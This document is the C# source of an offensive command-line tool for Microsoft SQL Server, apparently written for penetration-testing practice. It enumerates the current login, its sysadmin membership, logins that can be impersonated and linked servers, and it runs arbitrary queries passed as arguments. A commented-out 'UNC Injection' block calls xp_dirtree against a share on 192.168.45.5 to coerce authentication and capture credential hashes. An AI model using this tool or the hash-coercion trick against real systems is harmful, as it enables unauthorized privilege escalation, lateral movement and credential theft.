using System;
using System.IO;
using System.Data.SqlClient;

namespace MssqlCmd
{
    class Program
    {

        static SqlDataReader runSqlQuery(String query, SqlConnection con)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            return reader;
        }

        static void displayQueryOutput(String sqlServer, String database, String query)
        {
            SqlConnection con = makeConnection(sqlServer, database);

            if (con == null)
            {
                Console.WriteLine("Connection failed");
                Environment.Exit(0);
            }

            Console.WriteLine("Connection success!");

            SqlDataReader reader = runSqlQuery(query, con);
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            reader.Close();

            con.Close();
        }

        static SqlConnection makeConnection(String sqlServer, String database)
        {
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
            }
            catch
            {
                con = null;
            }

            return con;
        }

        static void performEnum (String sqlServer, String database)
        {
            SqlConnection con = makeConnection(sqlServer, database);

            if(con == null)
            {
                Console.WriteLine("Connection failed");
                Environment.Exit(0);
            }

            Console.WriteLine("Connection success!");

            SqlDataReader reader = runSqlQuery("SELECT SYSTEM_USER;", con);
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            reader = runSqlQuery("SELECT IS_SRVROLEMEMBER('public');", con);
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();

            reader = runSqlQuery("SELECT IS_SRVROLEMEMBER('sysadmin');", con);
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();

            // UNC Injection
            //String query = "EXEC master..xp_dirtree \"\\\\192.168.45.5\\test\";";
            //command = new SqlCommand(query, con);
            //reader = command.ExecuteReader();
            //reader.Close();

            reader = runSqlQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", con);
            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();


            reader = runSqlQuery("EXEC sp_linkedservers;", con);
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            reader.Close();

            con.Close();
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                // String appName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
                String exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                String exeName = Path.GetFileName(exePath);

                Console.WriteLine("Usage: ");
                Console.WriteLine("  Perform Enum - " + exeName + " server.fqdn master");
                Console.WriteLine("  Run Query    - " + exeName + " server.fqdn master \"query\"");
                System.Environment.Exit(1);
            }

            String sqlServer = args[0];
            String database = args[1];

            if (args.Length == 2)
            {
                Console.WriteLine("[+] Running Enum tasks on ");
                performEnum(sqlServer, database);
            }
            else
            {
                Console.Write("[+] Executing Query: ");
                String query = args[2];

                if(args.Length > 3)
                {
                    for (int i = 3; i < args.Length; i++)
                    {
                        query = query + " " + args[i];
                    }
                }

                Console.WriteLine(query);

                Console.Write("[+] Query output: ");

                displayQueryOutput(sqlServer, database, query);
            }

        }
    }
}
